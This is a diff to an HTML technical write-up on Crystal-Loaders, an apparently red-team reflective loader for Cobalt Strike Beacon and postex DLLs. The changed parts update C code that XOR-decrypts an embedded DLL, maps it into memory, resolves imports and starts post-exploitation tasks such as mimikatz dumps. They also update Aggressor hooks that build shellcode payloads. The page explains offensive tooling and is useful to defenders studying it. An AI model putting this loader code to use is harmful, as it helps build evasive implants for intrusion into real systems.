@@ -69,9 +69,9 @@
 <tr><td><strong>Syscall resolution</strong></td><td>Full <code>SYSCALL_API</code> via LibGate</td><td>None needed</td></tr>
 <tr><td><strong>DFR method</strong></td><td><code>ror13</code> (hash-based)</td><td><code>strings</code> (ASCII name-based)</td></tr>
 <tr><td><strong>API resolution</strong></td><td>PEB walking via <code>findModuleByHash</code></td><td><code>$GMH</code>/<code>$GPA</code> from parent Beacon</td></tr>
-<tr><td><strong>BUD population</strong></td><td>Full <code>USER_DATA</code></td><td>None</td></tr>
+<tr><td><strong>BUD population</strong></td><td>Full <code>BEACON_USER_DATA</code></td><td>None</td></tr>
 <tr><td><strong>Entry params</strong></td><td><code>go()</code> takes no args</td><td><code>go(void* loaderArguments)</code></td></tr>
-<tr><td><strong>DllMain calls</strong></td><td>3 (USER_DATA, ATTACH, START)</td><td>2 (ATTACH, START)</td></tr>
+<tr><td><strong>DllMain calls</strong></td><td>3 (BEACON_USER_DATA, ATTACH, START)</td><td>2 (ATTACH, START)</td></tr>
 <tr><td><strong>Memory tracking</strong></td><td><code>ALLOCATED_MEMORY_REGION</code></td><td><code>RDATA_SECTION</code></td></tr>
 <tr><td><strong>Section masking</strong></td><td>Full section tracking</td><td><code>.rdata</code> capture only</td></tr>
 </tbody>
@@ -159,15 +159,14 @@ x64:
 
 <p>Because the postex spec uses <code>dfr "resolve" "strings"</code>, Crystal Palace rewrites all <code>__imp_MODULE$Function</code> references to call <code>resolve()</code> with ASCII string arguments instead of ROR13 hashes. The postex <code>resolve()</code> function is correspondingly different from the Beacon UDRL's version:</p>
 
-<pre><code><span class="lang-tag">C (postex/loader.c)</span>PVOID resolve(LPCSTR moduleName, LPCSTR functionName)
+<pre><code><span class="lang-tag">C (postex/loader.c)</span>char * resolve(char * module, char * function)
 {
-    HMODULE hMod = pGetModuleHandle(moduleName);
+    HANDLE hModule = pGetModuleHandle(module);
 
-    if (hMod == NULL)
-        hMod = ((HMODULE (WINAPI *)(LPCSTR))
-            pGetProcAddress(pGetModuleHandle("KERNEL32"), "LoadLibraryA"))(moduleName);
+    if (hModule == NULL)
+        hModule = LoadLibraryA(module);
 
-    return pGetProcAddress(hMod, functionName);
+    return pGetProcAddress(hModule, function);
 }</code></pre>
 
 <p>This function is deceptively simple, but every line is significant:</p>
@@ -179,10 +178,10 @@ x64:
 <tr><th>Line</th><th>What It Does</th></tr>
 </thead>
 <tbody>
-<tr><td><code>pGetModuleHandle(moduleName)</code></td><td>Attempts to get a handle to the module using the patched <code>$GMH</code> pointer. This succeeds if the DLL is already loaded in the process (e.g., <code>kernel32.dll</code>, <code>ntdll.dll</code>).</td></tr>
-<tr><td><code>if (hMod == NULL)</code></td><td>If the module is not already loaded, the function needs to load it first. This happens when postex DLLs import from less common DLLs.</td></tr>
-<tr><td><code>pGetProcAddress(..., "LoadLibraryA")</code></td><td>Resolves <code>LoadLibraryA</code> from <code>KERNEL32</code> using the patched <code>$GPA</code> pointer. This is a one-time bootstrap to get the ability to load new DLLs.</td></tr>
-<tr><td><code>pGetProcAddress(hMod, functionName)</code></td><td>Finally resolves the target function from the (now loaded) module and returns its address.</td></tr>
+<tr><td><code>pGetModuleHandle(module)</code></td><td>Attempts to get a handle to the module using the patched <code>$GMH</code> pointer. This succeeds if the DLL is already loaded in the process (e.g., <code>kernel32.dll</code>, <code>ntdll.dll</code>).</td></tr>
+<tr><td><code>if (hModule == NULL)</code></td><td>If the module is not already loaded, the function needs to load it first. This happens when postex DLLs import from less common DLLs.</td></tr>
+<tr><td><code>LoadLibraryA(module)</code></td><td>Calls <code>LoadLibraryA</code> directly to load the module. This is available as a plain function call because it comes from <code>&lt;windows.h&gt;</code> and is not DFR-decorated.</td></tr>
+<tr><td><code>pGetProcAddress(hModule, function)</code></td><td>Finally resolves the target function from the (now loaded) module and returns its address.</td></tr>
 </tbody>
 </table>
 </div>
@@ -206,7 +205,7 @@ x64:
 <ul>
 <li>Takes two <strong>ASCII strings</strong> (module name, function name)</li>
 <li>Calls <code>pGetModuleHandle</code> (patched <code>$GMH</code>)</li>
-<li>Falls back to <code>LoadLibraryA</code> if module not loaded</li>
+<li>Falls back to <code>LoadLibraryA</code> (direct call, not DFR-decorated) if module not loaded</li>
 <li>Calls <code>pGetProcAddress</code> (patched <code>$GPA</code>)</li>
 <li>Depends on parent Beacon's function pointers</li>
 <li>Cannot operate independently &mdash; requires a running Beacon</li>
@@ -220,9 +219,9 @@ x64:
 <p>The Beacon UDRL tracks all allocated memory regions via <code>ALLOCATED_MEMORY_REGION</code> structures in the BUD. The postex loader uses a simpler tracking mechanism: it captures only the <code>.rdata</code> section's location and size.</p>
 
 <pre><code><span class="lang-tag">C (postex/loader.c)</span>typedef struct {
-    PVOID  Start;      // Start address of .rdata
-    SIZE_T Length;      // Size of .rdata
-    PVOID  IatOffset;  // Offset of IAT within .rdata
+    char * start;      // Start address of .rdata
+    DWORD  length;     // Size of .rdata
+    DWORD  offset;     // Offset of IAT within .rdata
 } RDATA_SECTION;</code></pre>
 
 <h3>Why Track .rdata?</h3>
@@ -261,39 +260,38 @@ x64:
 
 <pre><code><span class="lang-tag">C (postex/loader.c)</span>void go(void * loaderArguments)
 {
-    PRESOURCE dll = GETRESOURCE(_DLL_);
-    PRESOURCE key = GETRESOURCE(_KEY_);
+    RESOURCE * dll = (RESOURCE *)GETRESOURCE(_DLL_);
+    RESOURCE * key = (RESOURCE *)GETRESOURCE(_KEY_);
 
     // XOR unmask the encrypted postex DLL
-    PBYTE buf = KERNEL32$VirtualAlloc(
+    char * src = KERNEL32$VirtualAlloc(
         NULL, dll->length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     for (DWORD i = 0; i < dll->length; i++)
-        buf[i] = dll->data[i] ^ key->data[i % key->length];
+        src[i] = dll->value[i] ^ key->value[i % key->length];
 
     // Parse the decrypted PE
-    DLLDATA dlldata;
-    memset(&dlldata, 0, sizeof(DLLDATA));
-    ParseDLL(buf, &dlldata);
+    DLLDATA data;
+    ParseDLL(src, &data);
 
     // Allocate and load sections
-    DWORD size = SizeOfDLL(&dlldata);
-    PBYTE dst = KERNEL32$VirtualAlloc(
+    IMPORTFUNCS funcs;
+    DWORD size = SizeOfDLL(&data);
+    char * dst = KERNEL32$VirtualAlloc(
         NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    LoadDLL(&dlldata, dst);
-    ProcessImports(&dlldata, dst);
+    LoadDLL(&data, dst);
+    ProcessImports(&funcs, &data, dst);
 
     // Fix permissions and capture .rdata info
     RDATA_SECTION rdata;
-    memset(&rdata, 0, sizeof(RDATA_SECTION));
-    FixSectionPermissions(&dlldata, dst, &rdata);
+    FixSectionPermissions(&data, dst, &rdata);
 
     // Get entry point and clean up decryption buffer
-    DLLMAIN_FUNC entryPoint = (DLLMAIN_FUNC)EntryPoint(&dlldata, dst);
-    KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
+    DLLMAIN_FUNC entryPoint = (DLLMAIN_FUNC)EntryPoint(&data, dst);
+    KERNEL32$VirtualFree(src, 0, MEM_RELEASE);
 
     // Two DllMain calls (no USER_DATA needed)
-    entryPoint(dst, DLL_PROCESS_ATTACH, &rdata);       // pass rdata info
-    entryPoint(go, DLL_BEACON_START, loaderArguments);  // start with loader args
+    entryPoint((HINSTANCE)dst, DLL_PROCESS_ATTACH, &rdata);               // pass rdata info
+    entryPoint((HINSTANCE)GETRESOURCE(go), 0x04, loaderArguments);  // start with loader args
 }</code></pre>
 
 <p>Each phase of this function maps directly to a stage in the loading process:</p>
@@ -306,14 +304,14 @@ x64:
 </thead>
 <tbody>
 <tr><td><strong>Resource Retrieval</strong></td><td><code>GETRESOURCE</code></td><td>The <code>_DLL_</code> and <code>_KEY_</code> macros resolve to named sections that Crystal Palace linked into the PIC blob. <code>GETRESOURCE</code> uses RIP-relative addressing to locate them.</td></tr>
-<tr><td><strong>XOR Decryption</strong></td><td><code>VirtualAlloc</code> + XOR loop</td><td>Allocates a RW buffer and decrypts the postex DLL using a rolling XOR with the 128-byte key. The decrypted buffer is a raw PE file.</td></tr>
+<tr><td><strong>XOR Decryption</strong></td><td><code>VirtualAlloc</code> + XOR loop</td><td>Allocates a RW buffer (<code>src</code>) and decrypts the postex DLL using a rolling XOR with the 128-byte key. The decrypted buffer is a raw PE file.</td></tr>
 <tr><td><strong>PE Parsing</strong></td><td><code>ParseDLL</code></td><td>LibTCG parses the PE headers, section table, import directory, and relocation table into a <code>DLLDATA</code> structure.</td></tr>
 <tr><td><strong>Section Loading</strong></td><td><code>LoadDLL</code></td><td>Allocates the final image region (RW) and copies each PE section to its correct virtual address offset.</td></tr>
-<tr><td><strong>Import Resolution</strong></td><td><code>ProcessImports</code></td><td>Walks the import directory and resolves each function using the DFR-rewritten <code>resolve()</code>, which delegates to the patched <code>$GMH</code>/<code>$GPA</code>.</td></tr>
+<tr><td><strong>Import Resolution</strong></td><td><code>ProcessImports</code></td><td>Takes an <code>IMPORTFUNCS</code> struct, the <code>DLLDATA</code>, and <code>dst</code>. Walks the import directory and resolves each function using the DFR-rewritten <code>resolve()</code>, which delegates to the patched <code>$GMH</code>/<code>$GPA</code>.</td></tr>
 <tr><td><strong>Permission Fixing</strong></td><td><code>FixSectionPermissions</code></td><td>Sets correct page protections for each section (<code>.text</code> to RX, <code>.rdata</code> to R, <code>.data</code> to RW). Captures <code>.rdata</code> boundaries into the <code>RDATA_SECTION</code> struct.</td></tr>
-<tr><td><strong>Cleanup</strong></td><td><code>VirtualFree</code></td><td>Releases the temporary decryption buffer. The encrypted DLL data and XOR key are no longer needed.</td></tr>
-<tr><td><strong>DllMain #1</strong></td><td><code>DLL_PROCESS_ATTACH</code></td><td>Calls the postex DLL's entry point with <code>&amp;rdata</code> as the reserved parameter, giving it the information needed for .rdata obfuscation.</td></tr>
-<tr><td><strong>DllMain #2</strong></td><td><code>DLL_BEACON_START</code></td><td>Calls DllMain again with the <code>loaderArguments</code> from the parent Beacon, starting the actual postex operation (mimikatz dump, screenshot capture, etc.).</td></tr>
+<tr><td><strong>Cleanup</strong></td><td><code>VirtualFree</code></td><td>Releases the temporary decryption buffer (<code>src</code>). The encrypted DLL data and XOR key are no longer needed.</td></tr>
+<tr><td><strong>DllMain #1</strong></td><td><code>DLL_PROCESS_ATTACH</code></td><td>Calls the postex DLL's entry point with <code>(HINSTANCE)dst</code> and <code>&amp;rdata</code> as the reserved parameter, giving it the information needed for .rdata obfuscation.</td></tr>
+<tr><td><strong>DllMain #2</strong></td><td><code>0x04</code></td><td>Calls DllMain again with reason <code>0x04</code>, passing <code>(HINSTANCE)GETRESOURCE(go)</code> as the module handle and <code>loaderArguments</code> from the parent Beacon, starting the actual postex operation (mimikatz dump, screenshot capture, etc.).</td></tr>
 </tbody>
 </table>
 </div>
@@ -325,11 +323,11 @@ x64:
 <div class="card">
 <h4>Beacon UDRL: Three DllMain Calls</h4>
 <ol>
-<li><code>entryPoint(dst, DLL_PROCESS_ATTACH, &amp;userData)</code> &mdash; passes the full <code>USER_DATA</code> structure (containing <code>SYSCALL_API</code>, <code>RTL_API</code>, and <code>ALLOCATED_MEMORY</code>)</li>
-<li><code>entryPoint(dst, DLL_PROCESS_ATTACH, NULL)</code> &mdash; standard DLL initialization</li>
-<li><code>entryPoint(go, DLL_BEACON_START, NULL)</code> &mdash; starts the Beacon main loop</li>
+<li><code>entryPoint((HINSTANCE)0, DLL_BEACON_USER_DATA, &amp;bud)</code> &mdash; passes the <code>BEACON_USER_DATA</code> structure using the special <code>DLL_BEACON_USER_DATA</code> reason code and <code>(HINSTANCE)0</code> as the module handle</li>
+<li><code>entryPoint((HINSTANCE)dst, DLL_PROCESS_ATTACH, NULL)</code> &mdash; standard DLL initialization with the actual loaded image base</li>
+<li><code>entryPoint((HINSTANCE)GETRESOURCE(go), DLL_BEACON_START, NULL)</code> &mdash; starts the Beacon main loop</li>
 </ol>
-<p>The postex loader skips the first call entirely because there is no <code>USER_DATA</code> to pass. Postex DLLs do not need syscall stubs or memory region tracking &mdash; they operate within the context of an already-running Beacon that handles those concerns.</p>
+<p>The postex loader skips the first call entirely because there is no <code>BEACON_USER_DATA</code> to pass. Postex DLLs do not need syscall stubs or memory region tracking &mdash; they operate within the context of an already-running Beacon that handles those concerns.</p>
 </div>
 
 <!-- ============================================================ -->
@@ -338,37 +336,54 @@ x64:
 <p>The Aggressor script is the glue that connects Crystal Palace to Cobalt Strike's runtime. It implements the hooks that Cobalt Strike calls when it needs to generate loader payloads, passing the appropriate parameters to the Crystal Palace linker.</p>
 
 <pre><code><span class="lang-tag">Java/Sleep (crystalpalace.cna)</span>import crystalpalace.spec.* from: crystalpalace.jar;
+import java.util.HashMap;
 
-on BEACON_RDLL_GENERATE {
-    local('$spec');
+set BEACON_RDLL_GENERATE {
+    local('$spec $spec_path $result');
 
     // $1 = filename, $2 = beacon DLL bytes, $3 = arch
     if ($3 eq "x86") { return $null; }  // x64 only
 
-    $spec = [LinkSpec Parse: script_resource("udrl/loader.spec")];
-    return [$spec run: $2, new HashMap];
+    $spec_path = getFileProper(script_resource("udrl"), "loader.spec");
+    $spec = [LinkSpec Parse: $spec_path];
+    $result = [$spec run: $2, new HashMap];
+
+    if (strlen($result) == 0) {
+        warn("Crystal Palace: BEACON_RDLL_GENERATE failed");
+        return $null;
+    }
+
+    return $result;
 }
 
-on BEACON_RDLL_SIZE {
+set BEACON_RDLL_SIZE {
     return "0";  // dynamic size
 }
 
-on POSTEX_RDLL_GENERATE {
-    local('$spec $hashMap');
+set POSTEX_RDLL_GENERATE {
+    local('$spec $spec_path $hashMap $result');
 
     // $1 = filename, $2 = postex DLL bytes, $3 = arch
     // $4 = beacon ID, $5 = $GMH, $6 = $GPA
     if ($3 eq "x86") { return $null; }
 
-    $spec = [LinkSpec Parse: script_resource("postex-udrl/loader.spec")];
+    $spec_path = getFileProper(script_resource("postex-udrl"), "loader.spec");
+    $spec = [LinkSpec Parse: $spec_path];
     $hashMap = new HashMap;
     [$hashMap put: "\$GMH", cast($5, 'b')];
     [$hashMap put: "\$GPA", cast($6, 'b')];
 
-    return [$spec run: $2, $hashMap];
+    $result = [$spec run: $2, $hashMap];
+
+    if (strlen($result) == 0) {
+        warn("Crystal Palace: POSTEX_RDLL_GENERATE failed");
+        return $null;
+    }
+
+    return $result;
 }</code></pre>
 
-<p>The three hooks each serve a distinct purpose in the payload generation pipeline:</p>
+<p>The three hooks each serve a distinct purpose in the payload generation pipeline. Note that in Cobalt Strike's Sleep language, the <code>set</code> keyword assigns named hook callbacks (such as RDLL hooks), while <code>on</code> registers event handlers &mdash; these are different mechanisms. The <code>import java.util.HashMap</code> at the top makes the Java HashMap class available for passing patch variables.</p>
 
 <h3>BEACON_RDLL_GENERATE</h3>
 
@@ -381,8 +396,8 @@ on POSTEX_RDLL_GENERATE {
 <li><code>$2</code> &mdash; The raw Beacon DLL bytes (the PE file that needs to be loaded)</li>
 <li><code>$3</code> &mdash; The architecture string (<code>"x86"</code> or <code>"x64"</code>)</li>
 </ul>
-<p><strong>What it does:</strong> Parses the Beacon UDRL spec file, feeds it the Beacon DLL bytes (which become <code>$DLL</code> in the spec), and returns the complete PIC payload. The <code>new HashMap</code> is empty because the Beacon spec has no external variables to patch.</p>
-<p><strong>Return value:</strong> The final PIC shellcode blob, or <code>$null</code> if the architecture is x86 (Crystal-Loaders is x64-only).</p>
+<p><strong>What it does:</strong> Uses <code>getFileProper</code> to construct the spec file path and calls <code>LinkSpec Parse</code> to load the Beacon UDRL spec. Feeds it the Beacon DLL bytes (which become <code>$DLL</code> in the spec) and returns the complete PIC payload. The <code>new HashMap</code> is empty because the Beacon spec has no external variables to patch. Includes error handling: if the result has <code>strlen() == 0</code>, a <code>warn()</code> fallback fires and <code>$null</code> is returned.</p>
+<p><strong>Return value:</strong> The final PIC shellcode blob, or <code>$null</code> if the architecture is x86 (Crystal-Loaders is x64-only) or if Crystal Palace fails.</p>
 </div>
 
 <h3>BEACON_RDLL_SIZE</h3>
@@ -407,8 +422,8 @@ on POSTEX_RDLL_GENERATE {
 <li><code>$5</code> &mdash; The parent Beacon's <code>GetModuleHandleA</code> address (<code>$GMH</code>)</li>
 <li><code>$6</code> &mdash; The parent Beacon's <code>GetProcAddress</code> address (<code>$GPA</code>)</li>
 </ul>
-<p><strong>What it does:</strong> Parses the postex spec file, constructs a <code>HashMap</code> containing <code>$GMH</code> and <code>$GPA</code> as byte arrays (via <code>cast($5, 'b')</code>), and passes both the DLL bytes and the hash map to Crystal Palace. The <code>patch</code> directives in the spec resolve <code>$GMH</code> and <code>$GPA</code> from this hash map.</p>
-<p><strong>Return value:</strong> The complete postex PIC payload with patched-in function pointers.</p>
+<p><strong>What it does:</strong> Uses <code>getFileProper</code> to construct the spec file path and calls <code>LinkSpec Parse</code> to load the postex spec. Constructs a <code>HashMap</code> containing <code>$GMH</code> and <code>$GPA</code> as byte arrays (via <code>cast($5, 'b')</code>), and passes both the DLL bytes and the hash map to Crystal Palace. The <code>patch</code> directives in the spec resolve <code>$GMH</code> and <code>$GPA</code> from this hash map. Includes error handling: if the result has <code>strlen() == 0</code>, a <code>warn()</code> fallback fires and <code>$null</code> is returned.</p>
+<p><strong>Return value:</strong> The complete postex PIC payload with patched-in function pointers, or <code>$null</code> on failure.</p>
 </div>
 
 <div class="card highlight">
